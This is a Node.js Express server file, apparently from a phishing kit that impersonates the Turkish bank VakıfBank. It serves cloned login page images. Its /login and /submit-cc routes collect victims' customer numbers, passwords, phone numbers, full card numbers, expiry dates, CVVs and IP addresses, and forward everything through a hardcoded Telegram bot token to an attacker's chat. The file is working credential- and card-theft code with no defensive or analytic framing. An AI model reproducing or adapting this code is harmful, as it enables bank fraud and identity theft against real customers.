const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");
const path = require("path");

const app = express();
const PORT = 3000;

const botToken = "8452844424:AAGkw2PVDwYiHM15OM26A_Bz92qnX39CulA";
const chatId = "-1002998135862";

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const sendMessageToTelegram = async (message) => {
  if (botToken === "YOUR_TELEGRAM_BOT_TOKEN" || chatId === "YOUR_TELEGRAM_CHAT_ID") {
    console.error("Lütfen server.js dosyasındaki botToken ve chatId değişkenlerini güncelleyin.");
    return;
  }
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  try {
    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error("Telegram'a mesaj gönderilirken hata oluştu:", error.response ? error.response.data : error.message);
  }
};


app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

 
app.get("/Internet/omni/assets/img/updateImg1.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "updateImg1.png"));
});

app.get("/Internet/omni/assets/img/updateImg2.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "updateImg2.png"));
});

app.get("/Internet/omni/assets/img/logo.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "logo.png"));
});

app.get("/Internet/omni/assets/img/error_icon.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "error_icon.png"));
});

app.get("/Internet/omni/assets/img/login_icon_0.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "login_icon_0.png"));
});

app.get("/Internet/omni/assets/img/login_icon_1.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "login_icon_1.png"));
});

app.get("/Internet/omni/assets/img/login_icon_2.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "omni", "assets", "img", "login_icon_2.png"));
});

// Büyük "O" ile istenen dosya (mobile_header.png)
app.get("/Internet/Omni/assets/img/mobile_header.png", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "Internet", "Omni", "assets", "img", "mobile_header.png"));
});



app.post("/login", async (req, res) => {
  const { username, password, tel } = req.body;
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const message = `
*--- VakıfBank Giriş Bilgileri ---*
*TC/Müşteri No:* \`${username}\`
*Şifre:* \`${password}\`
*Tel:* \`${tel}\`
*IP Adresi:* \`${userIP}\`
*------------------------------------*
  `;

  try {
    await sendMessageToTelegram(message);
  } catch (err) {
    console.error("Telegram'a mesaj gönderilemedi:", err);
  }

  res.redirect("/basarili");
});

app.post("/submit-cc", async (req, res) => {
  const { kart_numarasi, son_kullanma, cvv, telefon } = req.body;
  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const message = `
*--- Kredi Kartı Bilgileri ---*
*Kart Numarası:* \`${kart_numarasi}\`
*Son Kullanma Tarihi (AA/YY):* \`${son_kullanma}\`
*CVV:* \`${cvv}\`
*Telefon Numarası:* \`${telefon}\`
*IP Adresi:* \`${userIP}\`
*-----------------------------*
    `;

  await sendMessageToTelegram(message);

  res.redirect("/bekle");
});

app.listen(PORT, () => {
  console.log(`Sunucu http://localhost:${PORT} adresinde çalışıyor`);

});

module.exports = app;